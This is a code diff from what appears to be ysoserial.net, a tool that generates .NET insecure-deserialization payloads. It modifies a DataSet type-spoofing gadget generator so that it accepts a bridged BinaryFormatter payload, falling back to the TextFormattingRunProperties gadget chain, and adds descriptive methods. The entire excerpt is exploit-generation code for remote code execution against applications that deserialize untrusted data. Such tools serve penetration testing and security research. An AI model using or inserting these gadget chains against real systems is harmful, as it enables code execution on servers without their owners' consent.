@@ -20,11 +20,30 @@ namespace ysoserial.Generators
             return "Soroush Dalili, Markus Wulftange, Jang";
         }
 
+        public override string AdditionalInfo()
+        {
+            return "A more advanced type spoofing which can use any arbitrary types can be seen in TestingArenaHome::SpoofByBinaryFormatterJson or in the DataSetOldBehaviour gadget";
+        }
+
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            byte[] init_payload =
-                (byte[]) new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
-            DataSetSpoofMarshal payloadDataSetMarshal = new DataSetSpoofMarshal(init_payload);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                binaryFormatterPayload = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
+            }
+
+                
+            DataSetSpoofMarshal payloadDataSetMarshal = new DataSetSpoofMarshal(binaryFormatterPayload);
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
